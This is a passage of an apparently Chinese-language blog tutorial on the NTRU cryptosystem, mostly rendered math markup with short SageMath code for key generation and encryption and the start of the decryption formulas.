278 43 278H29Q23 284 23 287ZM178 102Q200 26 252 26Q282 26 310 49T356 107Q374 141 392 215T411 325V331Q411 405 350 405Q339 405 328 402T306 393T286 380T269 365T254 350T243 336T235 326L232 322Q232 321 229 308T218 264T204 212Q178 106 178 102Z"/></g><g data-mml-node="mo" transform="translate(2634.8,0)"><path data-c="22C5" d="M78 250Q78 274 95 292T138 310Q162 310 180 294T199 251Q199 226 182 208T139 190T96 207T78 250Z"/></g><g data-mml-node="msub" transform="translate(3135,0)"><g data-mml-node="mi"><path data-c="1D453" d="M118 -162Q120 -162 124 -164T135 -167T147 -168Q160 -168 171 -155T187 -126Q197 -99 221 27T267 267T289 382V385H242Q195 385 192 387Q188 390 188 397L195 425Q197 430 203 430T250 431Q298 431 298 432Q298 434 307 482T319 540Q356 705 465 705Q502 703 526 683T550 630Q550 594 529 578T487 561Q443 561 443 603Q443 622 454 636T478 657L487 662Q471 668 457 668Q445 668 434 658T419 630Q412 601 403 552T387 469T380 433Q380 431 435 431Q480 431 487 430T498 424Q499 420 496 407T491 391Q489 386 482 386T428 385H372L349 263Q301 15 282 -47Q255 -132 212 -173Q175 -205 139 -205Q107 -205 81 -186T55 -132Q55 -95 76 -78T118 -61Q162 -61 162 -103Q162 -122 151 -136T127 -157L118 -162Z"/></g><g data-mml-node="mi" transform="translate(523,-150) scale(0.707)"><path data-c="1D45E" d="M33 157Q33 258 109 349T280 441Q340 441 372 389Q373 390 377 395T388 406T404 418Q438 442 450 442Q454 442 457 439T460 434Q460 425 391 149Q320 -135 320 -139Q320 -147 365 -148H390Q396 -156 396 -157T393 -175Q389 -188 383 -194H370Q339 -192 262 -192Q234 -192 211 -192T174 -192T157 -193Q143 -193 143 -185Q143 -182 145 -170Q149 -154 152 -151T172 -148Q220 -148 230 -141Q238 -136 258 -53T279 32Q279 33 272 29Q224 -10 172 -10Q117 -10 75 30T33 157ZM352 326Q329 405 277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q233 26 290 98L298 109L352 326Z"/></g></g><g data-mml-node="mo" transform="translate(4255.5,0)"><path data-c="22C5" d="M78 250Q78 274 95 292T138 310Q162 310 180 294T199 251Q199 226 182 208T139 190T96 207T78 250Z"/></g><g data-mml-node="mi" transform="translate(4755.7,0)"><path data-c="1D454" d="M311 43Q296 30 267 15T206 0Q143 0 105 45T66 160Q66 265 143 353T314 442Q361 442 401 394L404 398Q406 401 409 404T418 412T431 419T447 422Q461 422 470 413T480 394Q480 379 423 152T363 -80Q345 -134 286 -169T151 -205Q10 -205 10 -137Q10 -111 28 -91T74 -71Q89 -71 102 -80T116 -111Q116 -121 114 -130T107 -144T99 -154T92 -162L90 -164H91Q101 -167 151 -167Q189 -167 211 -155Q234 -144 254 -122T282 -75Q288 -56 298 -13Q311 35 311 43ZM384 328L380 339Q377 350 375 354T369 368T359 382T346 393T328 402T306 405Q262 405 221 352Q191 313 171 233T151 117Q151 38 213 38Q269 38 323 108L331 118L384 328Z"/></g><g data-mml-node="mtext" transform="translate(5232.7,0)"><path data-c="A0" d=""/></g><g data-mml-node="mtext" transform="translate(5482.7,0)"><path data-c="A0" d=""/></g><g data-mml-node="mtext" transform="translate(5732.7,0)"><path data-c="A0" d=""/></g><g data-mml-node="mo" transform="translate(5982.7,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"/></g><g data-mml-node="mi" transform="translate(6371.7,0)"><path data-c="1D45A" d="M21 287Q22 293 24 303T36 341T56 388T88 425T132 442T175 435T205 417T221 395T229 376L231 369Q231 367 232 367L243 378Q303 442 384 442Q401 442 415 440T441 433T460 423T475 411T485 398T493 385T497 373T500 364T502 357L510 367Q573 442 659 442Q713 442 746 415T780 336Q780 285 742 178T704 50Q705 36 709 31T724 26Q752 26 776 56T815 138Q818 149 821 151T837 153Q857 153 857 145Q857 144 853 130Q845 101 831 73T785 17T716 -10Q669 -10 648 17T627 73Q627 92 663 193T700 345Q700 404 656 404H651Q565 404 506 303L499 291L466 157Q433 26 428 16Q415 -11 385 -11Q372 -11 364 -4T353 8T350 18Q350 29 384 161L420 307Q423 322 423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 181Q151 335 151 342Q154 357 154 369Q154 405 129 405Q107 405 92 377T69 316T57 280Q55 278 41 278H27Q21 284 21 287Z"/></g><g data-mml-node="mi" transform="translate(7249.7,0)"><path data-c="1D45C" d="M201 -11Q126 -11 80 38T34 156Q34 221 64 279T146 380Q222 441 301 441Q333 441 341 440Q354 437 367 433T402 417T438 387T464 338T476 268Q476 161 390 75T201 -11ZM121 120Q121 70 147 48T206 26Q250 26 289 58T351 142Q360 163 374 216T388 308Q388 352 370 375Q346 405 306 405Q243 405 195 347Q158 303 140 230T121 120Z"/></g><g data-mml-node="mi" transform="translate(7734.7,0)"><path data-c="1D451" d="M366 683Q367 683 438 688T511 694Q523 694 523 686Q523 679 450 384T375 83T374 68Q374 26 402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487H491Q506 153 506 145Q506 140 503 129Q490 79 473 48T445 8T417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157Q33 205 53 255T101 341Q148 398 195 420T280 442Q336 442 364 400Q369 394 369 396Q370 400 396 505T424 616Q424 629 417 632T378 637H357Q351 643 351 645T353 664Q358 683 366 683ZM352 326Q329 405 277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q233 26 290 98L298 109L352 326Z"/></g><g data-mml-node="mtext" transform="translate(8254.7,0)"><path data-c="A0" d=""/></g><g data-mml-node="mi" transform="translate(8504.7,0)"><path data-c="1D45E" d="M33 157Q33 258 109 349T280 441Q340 441 372 389Q373 390 377 395T388 406T404 418Q438 442 450 442Q454 442 457 439T460 434Q460 425 391 149Q320 -135 320 -139Q320 -147 365 -148H390Q396 -156 396 -157T393 -175Q389 -188 383 -194H370Q339 -192 262 -192Q234 -192 211 -192T174 -192T157 -193Q143 -193 143 -185Q143 -182 145 -170Q149 -154 152 -151T172 -148Q220 -148 230 -141Q238 -136 258 -53T279 32Q279 33 272 29Q224 -10 172 -10Q117 -10 75 30T33 157ZM352 326Q329 405 277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q233 26 290 98L298 109L352 326Z"/></g><g data-mml-node="mo" transform="translate(8964.7,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"/></g></g></g></svg></mjx-container></span></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">def polyMod(f, q):</span><br><span class="line">    g = [f[i]%q for i in range(N)]</span><br><span class="line">    return R(g)</span><br><span class="line">    </span><br><span class="line">def liftMod(f, q):</span><br><span class="line">    g = list(((f[i] + q//2) % q) - q//2 for i in range(N))</span><br><span class="line">    return R(g)</span><br><span class="line"></span><br><span class="line">def invertModPrime(f, p):</span><br><span class="line">    Rp = R.change_ring(Integers(p)).quotient(x^N-1)</span><br><span class="line">    return R(lift(1 / Rp(f)))</span><br><span class="line"></span><br><span class="line">def invertModPow2(f, q):</span><br><span class="line">    assert q.is_power_of(2)</span><br><span class="line">    g = invertModPrime(f,2)</span><br><span class="line">    while True:</span><br><span class="line">        r = liftMod(convolution(g,f),q)</span><br><span class="line">        if r == 1: return g</span><br><span class="line">        g = liftMod(convolution(g,2 - r),q)</span><br><span class="line"></span><br><span class="line">def convolution(f, g):</span><br><span class="line">    return (f*g) % (x^N-1)</span><br><span class="line"></span><br><span class="line">Fp = polyMod(invertModPrime(f, p), p)</span><br><span class="line">Fq = polyMod(invertModPow2(f, q), q)</span><br><span class="line">h = polyMod(convolution(Fq, g), q)</span><br><span class="line"></span><br><span class="line">print("Fp = ", Fp)</span><br><span class="line"># Fp =  2*x^9 + 2*x^8 + 2*x^6 + 2*x^5 + x^4 + x^3 + 2*x + 1</span><br><span class="line">print("Fq = ", Fq)</span><br><span class="line"># Fq =  419*x^9 + 465*x^8 + 233*x^7 + 373*x^6 + 186*x^5 + 93*x^4 + 47*x^3 + 279*x^2 + 140*x + 326</span><br><span class="line">print("h = ", h)</span><br><span class="line"># h = 186*x^9 + 92*x^8 + 47*x^7 + 280*x^6 + 139*x^5 + 326*x^4 + 419*x^3 + 464*x^2 + 234*x + 373</span><br><span class="line"># 并不是所有的f，g都可以生成h。因为f很可能在上述模下没有逆。所以最好这两段代码应该用try封装，并封入genKey()的函数。</span><br></pre></td></tr></table></figure><p>至此，<strong>公钥h</strong>产生。<strong>私钥为<span class="math inline"><mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.65ex;" xmlns="http://www.w3.org/2000/svg" width="4.351ex" height="2.245ex" role="img" focusable="false" viewbox="0 -705 1923.3 992.2"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D453" d="M118 -162Q120 -162 124 -164T135 -167T147 -168Q160 -168 171 -155T187 -126Q197 -99 221 27T267 267T289 382V385H242Q195 385 192 387Q188 390 188 397L195 425Q197 430 203 430T250 431Q298 431 298 432Q298 434 307 482T319 540Q356 705 465 705Q502 703 526 683T550 630Q550 594 529 578T487 561Q443 561 443 603Q443 622 454 636T478 657L487 662Q471 668 457 668Q445 668 434 658T419 630Q412 601 403 552T387 469T380 433Q380 431 435 431Q480 431 487 430T498 424Q499 420 496 407T491 391Q489 386 482 386T428 385H372L349 263Q301 15 282 -47Q255 -132 212 -173Q175 -205 139 -205Q107 -205 81 -186T55 -132Q55 -95 76 -78T118 -61Q162 -61 162 -103Q162 -122 151 -136T127 -157L118 -162Z"/></g><g data-mml-node="mo" transform="translate(550,0)"><path data-c="2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z"/></g><g data-mml-node="msub" transform="translate(994.7,0)"><g data-mml-node="mi"><path data-c="1D453" d="M118 -162Q120 -162 124 -164T135 -167T147 -168Q160 -168 171 -155T187 -126Q197 -99 221 27T267 267T289 382V385H242Q195 385 192 387Q188 390 188 397L195 425Q197 430 203 430T250 431Q298 431 298 432Q298 434 307 482T319 540Q356 705 465 705Q502 703 526 683T550 630Q550 594 529 578T487 561Q443 561 443 603Q443 622 454 636T478 657L487 662Q471 668 457 668Q445 668 434 658T419 630Q412 601 403 552T387 469T380 433Q380 431 435 431Q480 431 487 430T498 424Q499 420 496 407T491 391Q489 386 482 386T428 385H372L349 263Q301 15 282 -47Q255 -132 212 -173Q175 -205 139 -205Q107 -205 81 -186T55 -132Q55 -95 76 -78T118 -61Q162 -61 162 -103Q162 -122 151 -136T127 -157L118 -162Z"/></g><g data-mml-node="mi" transform="translate(523,-150) scale(0.707)"><path data-c="1D45D" d="M23 287Q24 290 25 295T30 317T40 348T55 381T75 411T101 433T134 442Q209 442 230 378L240 387Q302 442 358 442Q423 442 460 395T497 281Q497 173 421 82T249 -10Q227 -10 210 -4Q199 1 187 11T168 28L161 36Q160 35 139 -51T118 -138Q118 -144 126 -145T163 -148H188Q194 -155 194 -157T191 -175Q188 -187 185 -190T172 -194Q170 -194 161 -194T127 -193T65 -192Q-5 -192 -24 -194H-32Q-39 -187 -39 -183Q-37 -156 -26 -148H-6Q28 -147 33 -136Q36 -130 94 103T155 350Q156 355 156 364Q156 405 131 405Q109 405 94 377T71 316T59 280Q57 278 43 278H29Q23 284 23 287ZM178 102Q200 26 252 26Q282 26 310 49T356 107Q374 141 392 215T411 325V331Q411 405 350 405Q339 405 328 402T306 393T286 380T269 365T254 350T243 336T235 326L232 322Q232 321 229 308T218 264T204 212Q178 106 178 102Z"/></g></g></g></g></svg></mjx-container></span> </strong></p><h2><span id="encryption">Encryption</span></h2><p><span class="math inline"><mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.025ex;" xmlns="http://www.w3.org/2000/svg" width="1.02ex" height="1.025ex" role="img" focusable="false" viewbox="0 -442 451 453"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D45F" d="M21 287Q22 290 23 295T28 317T38 348T53 381T73 411T99 433T132 442Q161 442 183 430T214 408T225 388Q227 382 228 382T236 389Q284 441 347 441H350Q398 441 422 400Q430 381 430 363Q430 333 417 315T391 292T366 288Q346 288 334 299T322 328Q322 376 378 392Q356 405 342 405Q286 405 239 331Q229 315 224 298T190 165Q156 25 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 114 189T154 366Q154 405 128 405Q107 405 92 377T68 316T57 280Q55 278 41 278H27Q21 284 21 287Z"/></g></g></g></svg></mjx-container></span>是0一个随机多项式。</p><p>加密方式为：<span class="math display"><mjx-container class="MathJax" jax="SVG" display="true"><svg style="vertical-align: -0.186ex;" xmlns="http://www.w3.org/2000/svg" width="12.782ex" height="1.756ex" role="img" focusable="false" viewbox="0 -694 5649.4 776"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D452" d="M39 168Q39 225 58 272T107 350T174 402T244 433T307 442H310Q355 442 388 420T421 355Q421 265 310 237Q261 224 176 223Q139 223 138 221Q138 219 132 186T125 128Q125 81 146 54T209 26T302 45T394 111Q403 121 406 121Q410 121 419 112T429 98T420 82T390 55T344 24T281 -1T205 -11Q126 -11 83 42T39 168ZM373 353Q367 405 305 405Q272 405 244 391T199 357T170 316T154 280T149 261Q149 260 169 260Q282 260 327 284T373 353Z"/></g><g data-mml-node="mo" transform="translate(743.8,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"/></g><g data-mml-node="mi" transform="translate(1799.6,0)"><path data-c="210E" d="M137 683Q138 683 209 688T282 694Q294 694 294 685Q294 674 258 534Q220 386 220 383Q220 381 227 388Q288 442 357 442Q411 442 444 415T478 336Q478 285 440 178T402 50Q403 36 407 31T422 26Q450 26 474 56T513 138Q516 149 519 151T535 153Q555 153 555 145Q555 144 551 130Q535 71 500 33Q466 -10 419 -10H414Q367 -10 346 17T325 74Q325 90 361 192T398 345Q398 404 354 404H349Q266 404 205 306L198 293L164 158Q132 28 127 16Q114 -11 83 -11Q69 -11 59 -2T48 16Q48 30 121 320L195 616Q195 629 188 632T149 637H128Q122 643 122 645T124 664Q129 683 137 683Z"/></g><g data-mml-node="mo" transform="translate(2597.8,0)"><path data-c="22C5" d="M78 250Q78 274 95 292T138 310Q162 310 180 294T199 251Q199 226 182 208T139 190T96 207T78 250Z"/></g><g data-mml-node="mi" transform="translate(3098,0)"><path data-c="1D45F" d="M21 287Q22 290 23 295T28 317T38 348T53 381T73 411T99 433T132 442Q161 442 183 430T214 408T225 388Q227 382 228 382T236 389Q284 441 347 441H350Q398 441 422 400Q430 381 430 363Q430 333 417 315T391 292T366 288Q346 288 334 299T322 328Q322 376 378 392Q356 405 342 405Q286 405 239 331Q229 315 224 298T190 165Q156 25 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 114 189T154 366Q154 405 128 405Q107 405 92 377T68 316T57 280Q55 278 41 278H27Q21 284 21 287Z"/></g><g data-mml-node="mo" transform="translate(3771.2,0)"><path data-c="2B" d="M56 237T56 250T70 270H369V420L370 570Q380 583 389 583Q402 583 409 568V270H707Q722 262 722 250T707 230H409V-68Q401 -82 391 -82H389H387Q375 -82 369 -68V230H70Q56 237 56 250Z"/></g><g data-mml-node="mi" transform="translate(4771.4,0)"><path data-c="1D45A" d="M21 287Q22 293 24 303T36 341T56 388T88 425T132 442T175 435T205 417T221 395T229 376L231 369Q231 367 232 367L243 378Q303 442 384 442Q401 442 415 440T441 433T460 423T475 411T485 398T493 385T497 373T500 364T502 357L510 367Q573 442 659 442Q713 442 746 415T780 336Q780 285 742 178T704 50Q705 36 709 31T724 26Q752 26 776 56T815 138Q818 149 821 151T837 153Q857 153 857 145Q857 144 853 130Q845 101 831 73T785 17T716 -10Q669 -10 648 17T627 73Q627 92 663 193T700 345Q700 404 656 404H651Q565 404 506 303L499 291L466 157Q433 26 428 16Q415 -11 385 -11Q372 -11 364 -4T353 8T350 18Q350 29 384 161L420 307Q423 322 423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 181Q151 335 151 342Q154 357 154 369Q154 405 129 405Q107 405 92 377T69 316T57 280Q55 278 41 278H27Q21 284 21 287Z"/></g></g></g></svg></mjx-container></span></p><p><span class="math inline"><mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.025ex;" xmlns="http://www.w3.org/2000/svg" width="1.054ex" height="1.025ex" role="img" focusable="false" viewbox="0 -442 466 453"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D452" d="M39 168Q39 225 58 272T107 350T174 402T244 433T307 442H310Q355 442 388 420T421 355Q421 265 310 237Q261 224 176 223Q139 223 138 221Q138 219 132 186T125 128Q125 81 146 54T209 26T302 45T394 111Q403 121 406 121Q410 121 419 112T429 98T420 82T390 55T344 24T281 -1T205 -11Q126 -11 83 42T39 168ZM373 353Q367 405 305 405Q272 405 244 391T199 357T170 316T154 280T149 261Q149 260 169 260Q282 260 327 284T373 353Z"/></g></g></g></svg></mjx-container></span>是密文，m是明文。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">def encrypt(m, h):</span><br><span class="line">  e = liftMod(p*convolution(h, T(d, d)) + m, q)</span><br><span class="line">  return e</span><br></pre></td></tr></table></figure><h2><span id="decryption">Decryption</span></h2><p><span class="math display"><mjx-container class="MathJax" jax="SVG" display="true"><svg style="vertical-align: -0.464ex;" xmlns="http://www.w3.org/2000/svg" width="14.579ex" height="2.059ex" role="img" focusable="false" viewbox="0 -705 6444 910"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D44E" d="M33 157Q33 258 109 349T280 441Q331 441 370 392Q386 422 416 422Q429 422 439 414T449 394Q449 381 412 234T374 68Q374 43 381 35T402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487Q506 153 506 144Q506 138 501 117T481 63T449 13Q436 0 417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157ZM351 328Q351 334 346 350T323 385T277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q217 26 254 59T298 110Q300 114 325 217T351 328Z"/></g><g data-mml-node="mo" transform="translate(806.8,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"/></g><g data-mml-node="mi" transform="translate(1862.6,0)"><path data-c="1D452" d="M39 168Q39 225 58 272T107 350T174 402T244 433T307 442H310Q355 442 388 420T421 355Q421 265 310 237Q261 224 176 223Q139 223 138 221Q138 219 132 186T125 128Q125 81 146 54T209 26T302 45T394 111Q403 121 406 121Q410 121 419 112T429 98T420 82T390 55T344 24T281 -1T205 -11Q126 -11 83 42T39 168ZM373 353Q367 405 305 405Q272 405 244 391T199 357T170 316T154 280T149 261Q149 260 169 260Q282 260 327 284T373 353Z"/></g><g data-mml-node="mo" transform="translate(2550.8,0)"><path data-c="22C5" d="M78 250Q78 274 95 292T138 310Q162 310 180 294T199 251Q199 226 182 208T139 190T96 207T78 250Z"/></g><g data-mml-node="mi" transform="translate(3051,0)"><path data-c="1D453" d="M118 -162Q120 -162 124 -164T135 -167T147 -168Q160 -168 171 -155T187 -126Q197 -99 221 27T267 267T289 382V385H242Q195 385 192 387Q188 390 188 397L195 425Q197 430 203 430T250 431Q298 431 298 432Q298 434 307 482T319 540Q356 705 465 705Q502 703 526 683T550 630Q550 594 529 578T487 561Q443 561 443 603Q443 622 454 636T478 657L487 662Q471 668 457 668Q445 668 434 658T419 630Q412 601 403 552T387 469T380 433Q380 431 435 431Q480 431 487 430T498 424Q499 420 496 407T491 391Q489 386 482 386T428 385H372L349 263Q301 15 282 -47Q255 -132 212 -173Q175 -205 139 -205Q107 -205 81 -186T55 -132Q55 -95 76 -78T118 -61Q162 -61 162 -103Q162 -122 151 -136T127 -157L118 -162Z"/></g><g data-mml-node="mtext" transform="translate(3601,0)"><path data-c="A0" d=""/></g><g data-mml-node="mi" transform="translate(3851,0)"><path data-c="1D45A" d="M21 287Q22 293 24 303T36 341T56 388T88 425T132 442T175 435T205 417T221 395T229 376L231 369Q231 367 232 367L243 378Q303 442 384 442Q401 442 415 440T441 433T460 423T475 411T485 398T493 385T497 373T500 364T502 357L510 367Q573 442 659 442Q713 442 746 415T780 336Q780 285 742 178T704 50Q705 36 709 31T724 26Q752 26 776 56T815 138Q818 149 821 151T837 153Q857 153 857 145Q857 144 853 130Q845 101 831 73T785 17T716 -10Q669 -10 648 17T627 73Q627 92 663 193T700 345Q700 404 656 404H651Q565 404 506 303L499 291L466 157Q433 26 428 16Q415 -11 385 -11Q372 -11 364 -4T353 8T350 18Q350 29 384 161L420 307Q423 322 423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 181Q151 335 151 342Q154 357 154 369Q154 405 129 405Q107 405 92 377T69 316T57 280Q55 278 41 278H27Q21 284 21 287Z"/></g><g data-mml-node="mi" transform="translate(4729,0)"><path data-c="1D45C" d="M201 -11Q126 -11 80 38T34 156Q34 221 64 279T146 380Q222 441 301 441Q333 441 341 440Q354 437 367 433T402 417T438 387T464 338T476 268Q476 161 390 75T201 -11ZM121 120Q121 70 147 48T206 26Q250 26 289 58T351 142Q360 163 374 216T388 308Q388 352 370 375Q346 405 306 405Q243 405 195 347Q158 303 140 230T121 120Z"/></g><g data-mml-node="mi" transform="translate(5214,0)"><path data-c="1D451" d="M366 683Q367 683 438 688T511 694Q523 694 523 686Q523 679 450 384T375 83T374 68Q374 26 402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487H491Q506 153 506 145Q506 140 503 129Q490 79 473 48T445 8T417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157Q33 205 53 255T101 341Q148 398 195 420T280 442Q336 442 364 400Q369 394 369 396Q370 400 396 505T424 616Q424 629 417 632T378 637H357Q351 643 351 645T353 664Q358 683 366 683ZM352 326Q329 405 277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q233 26 290 98L298 109L352 326Z"/></g><g data-mml-node="mtext" transform="translate(5734,0)"><path data-c="A0" d=""/></g><g data-mml-node="mi" transform="translate(5984,0)"><path data-c="1D45E" d="M33 157Q33 258 109 349T280 441Q340 441 372 389Q373 390 377 395T388 406T404 418Q438 442 450 442Q454 442 457 439T460 434Q460 425 391 149Q320 -135 320 -139Q320 -147 365 -148H390Q396 -156 396 -157T393 -175Q389 -188 383 -194H370Q339 -192 262 -192Q234 -192 211 -192T174 -192T157 -193Q143 -193 143 -185Q143 -182 145 -170Q149 -154 152 -151T172 -148Q220 -148 230 -141Q238 -136 258 -53T279 32Q279 33 272 29Q224 -10 172 -10Q117 -10 75 30T33 157ZM352 326Q329 405 277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q233 26 290 98L298 109L352 326Z"/></g></g></g></svg></mjx-container></span></p><p><span class="math display"><mjx-container class="MathJax" jax="SVG" display="true"><svg style="vertical-align: -0.566ex;" xmlns="http://www.w3.org/2000/svg" width="18.507ex" height="2.262ex" role="img" focusable="false" viewbox="0 -750 8180 1000"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D45A" d="M21 287Q22 293 24 303T36 341T56 388T88 425T132 442T175 435T205 417T221 395T229 376L231 369Q231 367 232 367L243 378Q303 442 384 442Q401 442 415 440T441 433T460 423T475 411T485 398T493 385T497 373T500 364T502 357L510 367Q573 442 659 442Q713 442 746 415T780 336Q780 285 742 178T704 50Q705 36 709 31T724 26Q752 26 776 56T815 138Q818 149 821 151T837 153Q857 153 857 145Q857 144 853 130Q845 101 831 73T785 17T716 -10Q669 -10 648 17T627 73Q627 92 663 193T700 345Q700 404 656 404H651Q565 404 506 303L499 291L466 157Q433 26 428 16Q415 -11 385 -11Q372 -11 364 -4T353 8T350 18Q350 29 384 161L420 307Q423 322 423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 181Q151 335 151 342Q154 357 154 369Q154 405 129 405Q107 405 92 377T69 316T57 280Q55 278 41 278H27Q21 284 21 287Z"/></g><g data-mml-node="mo" transform="translate(1155.8,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"/></g><g data-mml-node="mi" transform="translate(2211.6,0)"><path data-c="1D44E" d="M33 157Q33 258 109 349T280 441Q331 441 370 392Q386 422 416 422Q429 422 439 414T449 394Q449 381 412 234T374 68Q374 43 381 35T402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487Q506 153 506 144Q506 138 501 117T481 63T449 13Q436 0 417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157ZM351 328Q351 334 346 350T323 385T277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q217 26 254 59T298 110Q300 114 325 217T351 328Z"/></g><g data-mml-node="mo" transform="translate(2962.8,0)"><path data-c="22C5" d="M78 250Q78 274 95 292T138 310Q162 310 180 294T199 251Q199 226 182 208T139 190T96 207T78 250Z"/></g><g data-mml-node="mi" transform="translate(3463,0)"><path data-c="1D453" d="M118 -162Q120 -162 124 -164T135 -167T147 -168Q160 -168 171 -155T187 -126Q197 -99 221 27T267 267T289 382V385H242Q195 385 192 387Q188 390 188 397L195 425Q197 430 203 430T250 431Q298 431 298 432Q298 434 307 482T319 540Q356 705 465 705Q502 703 526 683T550 630Q550 594 529 578T487 561Q443 561 443 603Q443 622 454 636T478 657L487 662Q471 668 457 668Q445 668 434 658T419 630Q412 601 403 552T387 469T380 433Q380 431 435 431Q480 431 487 430T498 424Q499 420 496 407T491 391Q489 386 482 386T428 385H372L349 263Q301 15 282 -47Q255 -132 212 -173Q175 -205 139 -205Q107 -205 81 -186T55 -132Q55 -95 76 -78T118 -61Q162 -61 162 -103Q162 -122 151 -136T127 -157L118 -162Z"/></g><g data-mml-node="mi" transform="translate(4013,0)"><path data-c="1D45D" d="M23 287Q24 290 25 295T30 317T40 348T55 381T75 411T101 433T134 442Q209 442 230 378L240 387Q302 442 358 442Q423 442 460 395T497 281Q497 173 421 82T249 -10Q227 -10 210 -4Q199 1 187 11T168 28L161 36Q160 35 139 -51T118 -138Q118 -144 126 -145T163 -148H188Q194 -155 194 -157T191 -175Q188 -187 185 -190T172 -194Q170 -194 161 -194T127 -193T65 -192Q-5 -192 -24 -194H-32Q-39 -187 -39 -183Q-37 -156 -26 -148H-6Q28 -147 33 -136Q36 -130 94 103T155 350Q156 355 156 364Q156 405 131 405Q109 405 94 377T71 316T59 280Q57 278 43 278H29Q23 284 23 287ZM178 102Q200 26 252 26Q282 26 310 49T356 107Q374 141 392 215T411 325V331Q411 405 350 